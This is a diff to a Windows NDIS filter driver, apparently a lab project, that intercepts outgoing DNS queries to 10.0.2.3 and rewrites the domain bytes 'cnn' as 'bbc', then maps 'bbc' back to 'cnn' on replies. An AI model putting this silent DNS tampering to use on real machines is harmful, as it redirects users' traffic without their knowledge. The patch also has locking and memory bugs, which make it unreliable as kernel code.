@@ -42,7 +42,6 @@ NDIS_FILTER_PARTIAL_CHARACTERISTICS DefaultChars = {
 };
 
 
-UINT cnnCounter;
 
 _Use_decl_annotations_
 NTSTATUS
@@ -123,7 +122,7 @@ Return Value:
         FChars.CancelOidRequestHandler = NULL; //FilterCancelOidRequest;
 
         FChars.SendNetBufferListsHandler = FilterSendNetBufferLists;
-        FChars.ReturnNetBufferListsHandler = NULL;// FilterReturnNetBufferLists;
+        FChars.ReturnNetBufferListsHandler = FilterReturnNetBufferLists;
         FChars.SendNetBufferListsCompleteHandler = FilterSendNetBufferListsComplete;
         FChars.ReceiveNetBufferListsHandler = FilterReceiveNetBufferLists;
         FChars.DevicePnPEventNotifyHandler = NULL; //FilterDevicePnPEventNotify;
@@ -135,7 +134,6 @@ Return Value:
 
         FilterDriverHandle = NULL;
 
-        cnnCounter = 0;
 
         //
         // Initialize spin locks
@@ -1220,6 +1218,7 @@ Return Value:
     ULONG              NumOfSendCompletes = 0;
     BOOLEAN            DispatchLevel;
     PNET_BUFFER_LIST   CurrNbl;
+    PNET_BUFFER_LIST   parentNbl;
 
     //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "===> filterHelloWorld SendNBLComplete, NetBufferList: %p.\n", NetBufferLists));
     //DEBUGP(DL_TRACE, "===>SendNBLComplete, NetBufferList: %p.\n", NetBufferLists);
@@ -1257,9 +1256,17 @@ Return Value:
 
     // Send complete the NBLs.  If you removed any NBLs from the chain, make
     // sure the chain isn't empty (i.e., NetBufferLists!=NULL).
-
-    NdisFSendNetBufferListsComplete(pFilter->FilterHandle, NetBufferLists, SendCompleteFlags);
-    NdisFreeCloneNetBufferList(NetBufferLists, NDIS_CLONE_FLAGS_RESERVED);
+    if (NetBufferLists->SourceHandle == FilterModuleContext) {
+        parentNbl = NetBufferLists->ParentNetBufferList;
+        parentNbl->Status = NetBufferLists->Status;
+        NdisFreeCloneNetBufferList(NetBufferLists, NDIS_CLONE_FLAGS_RESERVED);
+        NdisFSendNetBufferListsComplete(pFilter->FilterHandle, parentNbl, SendCompleteFlags);
+    }
+    else {
+        NdisFSendNetBufferListsComplete(pFilter->FilterHandle, NetBufferLists, SendCompleteFlags);
+    }
+    
+    
     //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "<=== filterHelloWorld SendNBLComplete"));
     //DEBUGP(DL_TRACE, "<===SendNBLComplete.\n");
 }
@@ -1470,7 +1477,30 @@ USHORT calculateChecksum(PUSHORT dnsData, UINT dnsDataLegnth) {
     return (USHORT)~sum;
 }
 
-USHORT findCNN(PMDL currMdl, PVOID mdlSystemVa) {
+BOOLEAN findCNN(PVOID storageBuffer, ULONG dataLength) {
+    UINT x;
+    PUCHAR storageBufferByte = NULL;
+    UINT cnnString = 0x6e6e63;
+    PUINT pTargetString = NULL;// &cnnString;
+    UINT targetString;
+    UINT redirectString = 0x63626203;
+
+    storageBufferByte = storageBuffer;
+    for (x = 0; x < dataLength; x++) {
+        pTargetString = (PUINT)storageBufferByte;
+        targetString = *pTargetString;
+        targetString = targetString >>8;
+        if (targetString == cnnString) {
+            *pTargetString = redirectString;
+            return TRUE;
+        }
+        storageBufferByte++;
+    }
+
+    return FALSE;
+}
+
+USHORT changeCNN(PMDL currMdl, PVOID mdlSystemVa) {
     USHORT changeMade = 0;
     UINT x;
     ULONG mdlByteCount;
@@ -1487,10 +1517,9 @@ USHORT findCNN(PMDL currMdl, PVOID mdlSystemVa) {
         MdlTargetString = *pMdlTargetString;
         MdlTargetString = MdlTargetString >> 8;
         if ((MdlTargetString == cnnString)) {
-            KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld projectRedirect, pMdlTargetString: %s\n", (PCHAR)pMdlTargetString));
             *pMdlTargetString = redirectString;
             changeMade = 1;
-            KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld projectRedirect, pMdlTargetString: %s\n", (PCHAR)pMdlTargetString));
+            KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld changeCNN, pMdlTargetString: %s\n", (PCHAR)pMdlTargetString));
         }
         pMdlDataByte++;
     }
@@ -1499,7 +1528,7 @@ USHORT findCNN(PMDL currMdl, PVOID mdlSystemVa) {
 
 
 VOID redirectIPV4(PVOID storageBuffer, PNET_BUFFER currNb) {
-    UINT x;
+    //UINT x;
     PMY_ETHERNET_HEADER EthHeader = NULL;
     PMY_IPVFOUR_HEADER IP4Header = NULL;
     PMY_UDP_HEADER UDPHeader = NULL;
@@ -1510,17 +1539,17 @@ VOID redirectIPV4(PVOID storageBuffer, PNET_BUFFER currNb) {
     ULONG checksumOffset;
     PMDL currMdl = NULL;
     PVOID mdlSystemVa = NULL;
-    UINT cnnString = 0x6e6e63;
+    //UINT cnnString = 0x6e6e63;
     USHORT changeMade;
     USHORT mdlPreCount;
     USHORT mdlPostCount;
     PUSHORT pChecksum = NULL;
     UINT dnsDataLegnth;
-    UINT targetString;
-    PUCHAR pTargetDataByte = NULL;
-    PUINT pTargetString = NULL;
+    //UINT targetString;
+    //PUCHAR pTargetDataByte = NULL;
+    //PUINT pTargetString = NULL;
     USHORT testChecksum = 0;
-    UINT redirectString = 0x63626203;
+    //UINT redirectString = 0x63626203;
 
     EthHeader = (PMY_ETHERNET_HEADER)storageBuffer;
     IP4Header = (PMY_IPVFOUR_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER));
@@ -1532,63 +1561,62 @@ VOID redirectIPV4(PVOID storageBuffer, PNET_BUFFER currNb) {
 
     pPseudoheader = (PMY_UDP_PSEUDOHEADER)((PUCHAR)UDPHeader - sizeof(MY_UDP_PSEUDOHEADER));
 
-    if (((UDPHeader->DestinationPort == 0x3500) && (IP4Header->DestinationAddress == 0x0302000a))) {
-        mdlPreCount = 0;
-        mdlPostCount = 0;
-        checksumOffset = (ULONG)((PUCHAR)&UDPHeader->Checksum - (PUCHAR)EthHeader);
-        currMdl = currNb->CurrentMdl;
-        while (currMdl != NULL) {
-            mdlSystemVa = MmGetMdlVirtualAddress(currMdl);
-            changeMade = findCNN(currMdl, mdlSystemVa);
-            
-            //This assumes UDP Checksum will be in first mdl, domain name in second
-            if (changeMade == 0 && mdlPreCount == 0) {
-                pChecksum = (PUSHORT)((PUCHAR)mdlSystemVa + checksumOffset);
-                mdlPreCount++;
-            }
-            else if (changeMade == 1) {
-                //if (counter < 5) {
-                //    DbgBreakPoint();
-                //    counter++;
-                //}
-
-                
-                if (mdlPostCount == 0) {
-                    pChecksum = (PUSHORT)((PUCHAR)mdlSystemVa + checksumOffset);
-                }
-                pPseudoheader->SourceAddress = sourceAddress;
-                pPseudoheader->DestinationAddress = destinationAddress;
-                pPseudoheader->Protocol = protocol;
-                pPseudoheader->TotalLength = UDPHeader->Length;
-                pPseudoheader->zeros = 0;
-                pTargetDataByte = (PUCHAR)pPseudoheader + sizeof(MY_UDP_PSEUDOHEADER);
-                for (x = 0; x < UDPHeader->Length; x++) {
-                    pTargetString = (PUINT)pTargetDataByte;
-                    targetString = *pTargetString;
-                    targetString = targetString >> 8;
-                    if ((targetString == cnnString)) {
-                        //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld redirectIPV4, pTargetString: %s\n", (PCHAR)pTargetString));
-                        *pTargetString = redirectString;
-                        cnnCounter++;
-                        //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld redirectIPV4, pTargetString: %s\n", (PCHAR)pTargetString));
-                    }
-                    pTargetDataByte++;
-                }
-                dnsDataLegnth = currNb->DataLength - (UINT)((PUCHAR)pPseudoheader - (PUCHAR)storageBuffer);
-                testChecksum = calculateChecksum((PUSHORT)pPseudoheader, dnsDataLegnth);
-                UDPHeader->Checksum = 0;
-                testChecksum = calculateChecksum((PUSHORT)pPseudoheader, dnsDataLegnth);
-                *pChecksum = testChecksum;
-                checksumOffset = 0xffffffff;
-                changeMade = 0;
-                //if (counter < 5) {
-                //    DbgBreakPoint();
-                //    counter++;
-                //}
-            }
-            currMdl = currMdl->Next;
-            mdlPostCount++;
+    mdlPreCount = 0;
+    mdlPostCount = 0;
+    checksumOffset = (ULONG)((PUCHAR)&UDPHeader->Checksum - (PUCHAR)EthHeader);
+    currMdl = currNb->CurrentMdl;
+    while (currMdl != NULL) {
+        mdlSystemVa = MmGetMdlVirtualAddress(currMdl);
+        changeMade = changeCNN(currMdl, mdlSystemVa);
+        
+        //This assumes UDP Checksum will be in first mdl, domain name in second
+        if (changeMade == 0 && mdlPreCount == 0) {
+            pChecksum = (PUSHORT)((PUCHAR)mdlSystemVa + checksumOffset);
+            mdlPreCount++;
         }
+        else if (changeMade == 1) {
+            //if (counter < 5) {
+            //    DbgBreakPoint();
+            //    counter++;
+            //}
+
+            
+            if (mdlPostCount == 0) {
+                pChecksum = (PUSHORT)((PUCHAR)mdlSystemVa + checksumOffset);
+            }
+            pPseudoheader->SourceAddress = sourceAddress;
+            pPseudoheader->DestinationAddress = destinationAddress;
+            pPseudoheader->Protocol = protocol;
+            pPseudoheader->TotalLength = UDPHeader->Length;
+            pPseudoheader->zeros = 0;
+            
+            //THIS IS NOW DONE IN findCNN()
+            //pTargetDataByte = (PUCHAR)pPseudoheader + sizeof(MY_UDP_PSEUDOHEADER);
+            //for (x = 0; x < UDPHeader->Length; x++) {
+            //    pTargetString = (PUINT)pTargetDataByte;
+            //    targetString = *pTargetString;
+            //    targetString = targetString >> 8;
+            //    if ((targetString == cnnString)) {
+            //        //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld redirectIPV4, pTargetString: %s\n", (PCHAR)pTargetString));
+            //        *pTargetString = redirectString;
+            //        //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld redirectIPV4, pTargetString: %s\n", (PCHAR)pTargetString));
+            //    }
+            //    pTargetDataByte++;
+            //}
+            dnsDataLegnth = currNb->DataLength - (UINT)((PUCHAR)pPseudoheader - (PUCHAR)storageBuffer);
+            //testChecksum = calculateChecksum((PUSHORT)pPseudoheader, dnsDataLegnth);
+            UDPHeader->Checksum = 0;
+            testChecksum = calculateChecksum((PUSHORT)pPseudoheader, dnsDataLegnth);
+            *pChecksum = testChecksum;
+            checksumOffset = 0xffffffff;
+            changeMade = 0;
+            //if (counter < 5) {
+            //    DbgBreakPoint();
+            //    counter++;
+            //}
+        }
+        currMdl = currMdl->Next;
+        mdlPostCount++;
     }
 }
 
@@ -1607,6 +1635,19 @@ VOID redirectIPV6(PVOID storageBuffer, PNET_BUFFER currNb) {
         KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld redirectIPV6, IPv6 sent\n"));
     }
 }
+//PNET_BUFFER_LIST projectRedirect(PNET_BUFFER_LIST CurrNbl) {}
+
+VOID processSendClone(PNET_BUFFER_LIST clonedNbl, PVOID storageBuffer) {
+    PNET_BUFFER currNb = NULL;
+
+    currNb = NET_BUFFER_LIST_FIRST_NB(clonedNbl);
+    while (currNb != NULL) {
+        redirectIPV4(storageBuffer, currNb);
+        currNb = NET_BUFFER_NEXT_NB(currNb);
+    }
+}
+
+
 
 VOID projectRedirect(PNET_BUFFER_LIST CurrNbl) {
     PNET_BUFFER currNb = NULL;
@@ -1648,6 +1689,78 @@ VOID projectRedirect(PNET_BUFFER_LIST CurrNbl) {
     ExFreePool(storageBuffer);
 }
 
+UCHAR getIPVersion(PVOID storageBuffer) {
+    UCHAR IPversion;
+    PMY_ETHERNET_HEADER EthHeader = NULL;
+    PMY_IPVFOUR_HEADER IP4Header = NULL;
+
+    EthHeader = (PMY_ETHERNET_HEADER)storageBuffer;
+    IP4Header = (PMY_IPVFOUR_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER));
+    IPversion = IP4Header->VersionAndIHL;
+    IPversion = IPversion >> 4;
+    return IPversion;
+}
+
+USHORT getDestPort(PVOID storageBuffer) {
+    PMY_ETHERNET_HEADER EthHeader = NULL;
+    PMY_IPVFOUR_HEADER IP4Header = NULL;
+    PMY_UDP_HEADER UDPHeader = NULL;
+
+    EthHeader = (PMY_ETHERNET_HEADER)storageBuffer;
+    IP4Header = (PMY_IPVFOUR_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER));
+    UDPHeader = (PMY_UDP_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER) + sizeof(MY_IPVFOUR_HEADER));
+
+    return UDPHeader->DestinationPort;
+}
+
+USHORT getSourcePort(PVOID storageBuffer) {
+    PMY_ETHERNET_HEADER EthHeader = NULL;
+    PMY_IPVFOUR_HEADER IP4Header = NULL;
+    PMY_UDP_HEADER UDPHeader = NULL;
+
+    EthHeader = (PMY_ETHERNET_HEADER)storageBuffer;
+    IP4Header = (PMY_IPVFOUR_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER));
+    UDPHeader = (PMY_UDP_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER) + sizeof(MY_IPVFOUR_HEADER));
+
+    return UDPHeader->SourcePort;
+}
+
+UINT getDestAddress(PVOID storageBuffer) {
+    PMY_ETHERNET_HEADER EthHeader = NULL;
+    PMY_IPVFOUR_HEADER IP4Header = NULL;
+    PMY_UDP_HEADER UDPHeader = NULL;
+
+    EthHeader = (PMY_ETHERNET_HEADER)storageBuffer;
+    IP4Header = (PMY_IPVFOUR_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER));
+    UDPHeader = (PMY_UDP_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER) + sizeof(MY_IPVFOUR_HEADER));
+
+    return IP4Header->DestinationAddress;
+}
+
+UINT getSourceAddress(PVOID storageBuffer) {
+    PMY_ETHERNET_HEADER EthHeader = NULL;
+    PMY_IPVFOUR_HEADER IP4Header = NULL;
+    PMY_UDP_HEADER UDPHeader = NULL;
+
+    EthHeader = (PMY_ETHERNET_HEADER)storageBuffer;
+    IP4Header = (PMY_IPVFOUR_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER));
+    UDPHeader = (PMY_UDP_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER) + sizeof(MY_IPVFOUR_HEADER));
+
+    return IP4Header->SourceAddress;
+}
+
+ULONG getChecksumOffset(PVOID storageBuffer) {
+    PMY_ETHERNET_HEADER EthHeader = NULL;
+    PMY_IPVFOUR_HEADER IP4Header = NULL;
+    PMY_UDP_HEADER UDPHeader = NULL;
+
+    EthHeader = (PMY_ETHERNET_HEADER)storageBuffer;
+    IP4Header = (PMY_IPVFOUR_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER));
+    UDPHeader = (PMY_UDP_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER) + sizeof(MY_IPVFOUR_HEADER));
+
+    return (ULONG)((PUCHAR)&UDPHeader->Checksum - (PUCHAR)EthHeader);
+}
+
 _Use_decl_annotations_
 VOID
 FilterSendNetBufferLists(
@@ -1682,12 +1795,18 @@ Arguments:
     BOOLEAN             DispatchLevel;
     BOOLEAN             bFalse = FALSE;
     PNET_BUFFER_LIST    clonedNbl = NULL;
-    //NDIS_HANDLE         clonedNblHandle = NULL;
-    //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld FilterSendNetBufferLists, PortNumber dec = %d, PortNumber hex = %x\n", PortNumber, PortNumber));
+    PNET_BUFFER_LIST    sendNbl = NetBufferLists;
+    PNET_BUFFER currNb = NULL;
+    PVOID storageBuffer = NULL;
+    UCHAR IPversion;
+    //PMY_ETHERNET_HEADER EthHeader = NULL;
+    //PMY_IPVFOUR_HEADER IP4Header = NULL;
+    USHORT destPort;
+    UINT destAddress;
+    BOOLEAN cnnFound;
     
     //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "===> filterHelloWorld SendNetBufferList: NBL = %p.\n", NetBufferLists));
-    //DEBUGP(DL_TRACE, "===>SendNetBufferList: NBL = %p.\n", NetBufferLists);
-    clonedNbl = NdisAllocateCloneNetBufferList(NetBufferLists, NULL, NULL, NDIS_CLONE_FLAGS_RESERVED);
+    
     //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "===> filterHelloWorld SendNetBufferList: clonedNbl = %p.\n", clonedNbl));
 
     do
@@ -1705,7 +1824,7 @@ Arguments:
         //
         if (pFilter->State != FilterRunning)
         {
-            NdisFreeCloneNetBufferList(clonedNbl, NDIS_CLONE_FLAGS_RESERVED);
+            //NdisFreeCloneNetBufferList(clonedNbl, NDIS_CLONE_FLAGS_RESERVED);
             FILTER_RELEASE_LOCK(&pFilter->Lock, DispatchLevel);
 
             CurrNbl = NetBufferLists;
@@ -1722,14 +1841,55 @@ Arguments:
         }
         FILTER_RELEASE_LOCK(&pFilter->Lock, DispatchLevel);
 #endif
-        
+
+        //
         if (pFilter->TrackSends)
         {
+
             FILTER_ACQUIRE_LOCK(&pFilter->Lock, DispatchLevel);
-            CurrNbl = clonedNbl;
+            CurrNbl = NetBufferLists;
             while (CurrNbl)
             {
-                projectRedirect(CurrNbl);
+                //projectRedirect(CurrNbl);
+                currNb = NET_BUFFER_LIST_FIRST_NB(CurrNbl);
+
+                storageBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, currNb->DataLength, 'Tag1');
+                if (storageBuffer == NULL) {
+                    KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld projectRedirect, ExAllocatePool2 Fail\n"));
+                    return;
+                }
+                while (currNb != NULL) {
+
+                    NdisGetDataBuffer(currNb, currNb->DataLength, storageBuffer, 4, 0);
+                    if (storageBuffer == NULL) {
+                        KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld projectRedirect, NdisGetDataBuffer Fail\n"));
+                        ExFreePool(storageBuffer);
+                        return;
+                    }
+                    
+                    IPversion = getIPVersion(storageBuffer);
+                    if (IPversion == 4) {
+                        destPort = getDestPort(storageBuffer);
+                        destAddress = getDestAddress(storageBuffer);
+                        if ((destPort == 0x3500) && (destAddress == 0x0302000a)) {
+                            cnnFound = findCNN(storageBuffer, currNb->DataLength);
+                            if (cnnFound == TRUE){
+                                clonedNbl = NdisAllocateCloneNetBufferList(NetBufferLists, NULL, NULL, NDIS_CLONE_FLAGS_RESERVED);
+                                clonedNbl->ParentNetBufferList = NetBufferLists;
+                                clonedNbl->SourceHandle = FilterModuleContext;
+                                sendNbl = clonedNbl;
+                                processSendClone(clonedNbl, storageBuffer);
+                            }
+                        }
+                        //redirectIPV4(storageBuffer, currNb);
+                    }
+                    //else if (IPversion == 6) {
+                    //    redirectIPV6(storageBuffer, currNb);
+                    //}
+                    currNb = NET_BUFFER_NEXT_NB(currNb);
+
+                }
+                ExFreePool(storageBuffer);
                 pFilter->OutstandingSends++;
                 FILTER_LOG_SEND_REF(1, pFilter, CurrNbl, pFilter->OutstandingSends);
 
@@ -1746,7 +1906,7 @@ Arguments:
         // deep copy, and complete the original NBL.
         //
 
-        NdisFSendNetBufferLists(pFilter->FilterHandle, clonedNbl, PortNumber, SendFlags);
+        NdisFSendNetBufferLists(pFilter->FilterHandle, sendNbl, PortNumber, SendFlags);
         
 
     }
@@ -1755,6 +1915,38 @@ Arguments:
 
     //DEBUGP(DL_TRACE, "<===SendNetBufferList. \n");
 }
+//
+//VOID returnRedirect(PNET_BUFFER_LIST CurrNbl) {
+//    PNET_BUFFER currNb = NULL;
+//    PMY_ETHERNET_HEADER EthHeader = NULL;
+//    PMY_IPVFOUR_HEADER IP4Header = NULL;
+//    UCHAR IPversion;
+//    PMDL currMdl = NULL;
+//    PVOID mdlSystemVa;
+//
+//    currNb = NET_BUFFER_LIST_FIRST_NB(CurrNbl);
+//    while (currNb != NULL) {
+//        currMdl = currNb->CurrentMdl;
+//        mdlSystemVa = MmGetMdlVirtualAddress(currMdl);
+//        EthHeader = (PMY_ETHERNET_HEADER)mdlSystemVa;
+//        IP4Header = (PMY_IPVFOUR_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER));
+//        IPversion = IP4Header->VersionAndIHL;
+//        IPversion = IPversion >> 4;
+//        if (IPversion == 4) {
+//            returnIPV4(currNb);
+//        }
+//        else if (IPversion == 6) {
+//            returnIPV6(currNb);
+//        }
+//        else {
+//            if (EthHeader->EtherType != 0x608) {
+//                KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld retunRedirect, something else returned\n"));
+//                DbgBreakPoint();
+//            }
+//        }
+//        currNb = NET_BUFFER_NEXT_NB(currNb);
+//    }
+//}
 
 _Use_decl_annotations_
 VOID
@@ -1791,6 +1983,7 @@ Arguments:
     UINT                NumOfNetBufferLists = 0;
     BOOLEAN             DispatchLevel;
     ULONG               Ref;
+    PNET_BUFFER_LIST   parentNbl;
 
     //DEBUGP(DL_TRACE, "===>ReturnNetBufferLists, NetBufferLists is %p.\n", NetBufferLists);
     //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "===> filterHelloWorld ReturnNetBufferLists, NetBufferLists is %p.\n", NetBufferLists));
@@ -1815,21 +2008,85 @@ Arguments:
     //    counter++;
     //}
 
+    //PNET_BUFFER currNb = NULL;
+    //PMY_ETHERNET_HEADER EthHeader = NULL;
+    //PMY_IPVFOUR_HEADER IP4Header = NULL;
+    //PMY_UDP_HEADER UDPHeader = NULL;
+    //UCHAR IPversion;
+    //PMDL currMdl = NULL;
+    //PVOID mdlSystemVa;
+    //ULONG checksumOffset;
+    //ULONG mdlByteCount;
+    //PUCHAR pMdlDataByte = NULL;
+    //UINT bbcString = 0x636262;
+    //UINT cnnString = 0x6e6e63;
+    //PUINT pMdlTargetString = &bbcString;
+    //UINT MdlTargetString;
+    //UINT x;
+
+
     if (pFilter->TrackReceives)
     {
         while (CurrNbl)
         {
-            NumOfNetBufferLists ++;
+            //currNb = NET_BUFFER_LIST_FIRST_NB(CurrNbl);
+            //while (currNb != NULL) {
+            //    currMdl = currNb->CurrentMdl;
+            //    mdlSystemVa = MmGetMdlVirtualAddress(currMdl);
+            //    mdlByteCount = MmGetMdlByteCount(currMdl);
+            //    EthHeader = (PMY_ETHERNET_HEADER)mdlSystemVa;
+            //    IP4Header = (PMY_IPVFOUR_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER));
+            //    IPversion = IP4Header->VersionAndIHL;
+            //    IPversion = IPversion >> 4;
+            //    if (IPversion == 4) {
+            //        UDPHeader = (PMY_UDP_HEADER)((char*)EthHeader + sizeof(MY_ETHERNET_HEADER) + sizeof(MY_IPVFOUR_HEADER));
+            //        if (UDPHeader->SourcePort == 0x3500) {
+            //            checksumOffset = (ULONG)((PUCHAR)&UDPHeader->Checksum - (PUCHAR)EthHeader);
+            //            //currMdl = currNb->CurrentMdl;
+            //            while (currMdl != NULL) {
+            //                //mdlSystemVa = MmGetMdlVirtualAddress(currMdl);
+            //                //mdlByteCount = MmGetMdlByteCount(currMdl);
+            //                pMdlDataByte = (PUCHAR)mdlSystemVa;
+            //                for (x = 0; x < mdlByteCount; x++) {
+            //                    pMdlTargetString = (PUINT)pMdlDataByte;
+            //                    MdlTargetString = *pMdlTargetString;
+            //                    MdlTargetString = MdlTargetString >> 8;
+            //                    if (MdlTargetString == cnnString) {
+            //                        
+            //                        //if (counter < 5) {
+            //                        //    DbgBreakPoint();
+            //                        //    counter++;
+            //                        //}
+            //                        KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "<=== filterHelloWorld ReturnNetBufferLists: CNN Found\n"));
+            //                        break;
+            //                    }
+            //                    pMdlDataByte++;
+            //                }
+            //                currMdl = currMdl->Next;
+            //            }
+            //        }
+            //    }
+            //    currNb = NET_BUFFER_NEXT_NB(currNb);
+            //}
+            NumOfNetBufferLists++;
             CurrNbl = NET_BUFFER_LIST_NEXT_NBL(CurrNbl);
         }
     }
 
-
+    if (NetBufferLists->SourceHandle == FilterModuleContext) {
+        parentNbl = NetBufferLists->ParentNetBufferList;
+        parentNbl->Status = NetBufferLists->Status;
+        NdisFreeCloneNetBufferList(NetBufferLists, NDIS_CLONE_FLAGS_RESERVED);
+        NdisFReturnNetBufferLists(pFilter->FilterHandle, parentNbl, ReturnFlags);
+    }
+    else {
+        NdisFReturnNetBufferLists(pFilter->FilterHandle, NetBufferLists, ReturnFlags);
+    }
     // Return the received NBLs.  If you removed any NBLs from the chain, make
     // sure the chain isn't empty (i.e., NetBufferLists!=NULL).
-
-    NdisFReturnNetBufferLists(pFilter->FilterHandle, NetBufferLists, ReturnFlags);
-    
+   
+    //
+    //NdisFreeCloneNetBufferList(NetBufferLists, NDIS_CLONE_FLAGS_RESERVED);
     if (pFilter->TrackReceives)
     {
         DispatchLevel = NDIS_TEST_RETURN_AT_DISPATCH_LEVEL(ReturnFlags);
@@ -1848,13 +2105,36 @@ Arguments:
 
 }
 
-USHORT findBBC(PMDL currMdl, PVOID mdlSystemVa) {
+BOOLEAN findBBC(PVOID storageBuffer, ULONG dataLength) {
+    UINT x;
+    PUCHAR storageBufferByte = NULL;
+    UINT bbcString = 0x636262;
+    PUINT pTargetString = NULL;// &cnnString;
+    UINT targetString;
+    UINT redirectString = 0x6e6e6303;
+
+    storageBufferByte = storageBuffer;
+    for (x = 0; x < dataLength; x++) {
+        pTargetString = (PUINT)storageBufferByte;
+        targetString = *pTargetString;
+        targetString = targetString >> 8;
+        if (targetString == bbcString) {
+            *pTargetString = redirectString;
+            return TRUE;
+        }
+        storageBufferByte++;
+    }
+
+    return FALSE;
+}
+
+USHORT changeBBC(PMDL currMdl, PVOID mdlSystemVa) {
     USHORT changeMade = 0;
     UINT x;
     ULONG mdlByteCount;
     PUCHAR pMdlDataByte = NULL;
     UINT bbcString = 0x636262;
-    PUINT pMdlTargetString = &bbcString;
+    PUINT pMdlTargetString = NULL;// &bbcString;
     UINT MdlTargetString;
     UINT redirectString = 0x6e6e6303;
 
@@ -1865,11 +2145,9 @@ USHORT findBBC(PMDL currMdl, PVOID mdlSystemVa) {
         MdlTargetString = *pMdlTargetString;
         MdlTargetString = MdlTargetString >> 8;
         if ((MdlTargetString == bbcString)) {
-            KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld projectRedirect, pMdlTargetString: %s\n", (PCHAR)pMdlTargetString));
             *pMdlTargetString = redirectString;
-            cnnCounter--;
             changeMade = 1;
-            KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld projectRedirect, pMdlTargetString: %s\n", (PCHAR)pMdlTargetString));
+            KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld changeBBC, pMdlTargetString: %s\n", (PCHAR)pMdlTargetString));
         }
         pMdlDataByte++;
     }
@@ -1877,7 +2155,7 @@ USHORT findBBC(PMDL currMdl, PVOID mdlSystemVa) {
 }
 
 
-VOID acceptIPV4(PNET_BUFFER currNb) {
+VOID acceptIPV4(PVOID storageBuffer, PNET_BUFFER currNb) {
     PMY_ETHERNET_HEADER EthHeader = NULL;
     PMY_IPVFOUR_HEADER IP4Header = NULL;
     PMY_UDP_HEADER UDPHeader = NULL;
@@ -1887,7 +2165,7 @@ VOID acceptIPV4(PNET_BUFFER currNb) {
     UCHAR protocol;
     USHORT totalLength;
     ULONG checksumOffset;
-    UINT changeMade;
+    USHORT changeMade;
     PMDL currMdl = NULL;
     PVOID mdlSystemVa = NULL;
     PUSHORT pChecksum = NULL;
@@ -1895,7 +2173,6 @@ VOID acceptIPV4(PNET_BUFFER currNb) {
     UINT mdlPostCount;
     UINT dnsDataLegnth;
     USHORT newChecksum;
-    PVOID storageBuffer = NULL;
 
     currMdl = currNb->CurrentMdl;
     mdlSystemVa = MmGetMdlVirtualAddress(currMdl);
@@ -1908,55 +2185,43 @@ VOID acceptIPV4(PNET_BUFFER currNb) {
     protocol = IP4Header->Protocol;
     totalLength = UDPHeader->Length;
 
-    if (UDPHeader->SourcePort == 0x3500) {
-        checksumOffset = (ULONG)((PUCHAR)&UDPHeader->Checksum - (PUCHAR)EthHeader);
-        currMdl = currNb->CurrentMdl;
-        mdlPreCount = 0;
-        mdlPostCount = 0;
-        while (currMdl != NULL) {
-            mdlSystemVa = MmGetMdlVirtualAddress(currMdl);
-            changeMade = findBBC(currMdl, mdlSystemVa);
-            if (changeMade == 0 && mdlPreCount == 0) {
-                pChecksum = (PUSHORT)((PUCHAR)mdlSystemVa + checksumOffset);
-                mdlPreCount++;
-            }
-            else if (changeMade == 1) {
-                //if (counter < 5) {
-                //    DbgBreakPoint();
-                //    counter++;
-                //}
-                if (mdlPostCount == 0) {
-                    pChecksum = (PUSHORT)((PUCHAR)mdlSystemVa + checksumOffset);
-                }
-                storageBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, currNb->DataLength, 'Tag2');
-                if (storageBuffer == NULL) {
-                    KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld projectRedirect, ExAllocatePool2 Fail\n"));
-                    return;
-                }
-                NdisGetDataBuffer(currNb, currNb->DataLength, storageBuffer, 0, 0);
-                if (storageBuffer == NULL) {
-                    KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld acceptRedirect, NdisGetDataBuffer Fail\n"));
-                    return;
-                }
-                UDPHeader = (PMY_UDP_HEADER)((char*)storageBuffer + sizeof(MY_ETHERNET_HEADER) + sizeof(MY_IPVFOUR_HEADER));
-                pPseudoheader = (PMY_UDP_PSEUDOHEADER)((PUCHAR)UDPHeader - sizeof(MY_UDP_PSEUDOHEADER));
-                pPseudoheader->SourceAddress = sourceAddress;
